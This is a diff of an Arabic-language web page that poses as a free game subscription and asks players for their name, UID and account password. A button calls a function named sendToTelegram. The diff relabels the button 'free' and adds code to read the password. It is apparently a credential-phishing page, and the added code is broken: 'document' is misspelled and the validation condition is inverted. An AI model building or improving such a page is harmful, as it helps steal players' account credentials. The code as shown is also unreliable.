@@ -126,7 +126,7 @@
             <input type="number" password="password" placeholder=" ادخل كلمه السر الخاصه بالحساب" required>
         </div> 
 
-        <button onclick="sendToTelegram()">اشترك الآن 🔥</button>
+        <button onclick="sendToTelegram()"> مجانا اشترك الآن 🔥</button>
         <div class="success-msg" id="successMsg">🎉 تم تسجيل اشتراكك بنجاح! حظاً موفقاً.</div>
     </div>
 
@@ -134,8 +134,8 @@
         function sendToTelegram() {
             const name = document.getElementById('playerName').value;
             const uid = document.getElementById('playerUid').value;
-
-            if(!name || !uid) {
+            const password = decument.getElementById("password").value;
+            if(!name || !uid|| password) {
                 alert("يرجى إدخال الاسم والـ UID للمشاركة!");
                 return;
             }
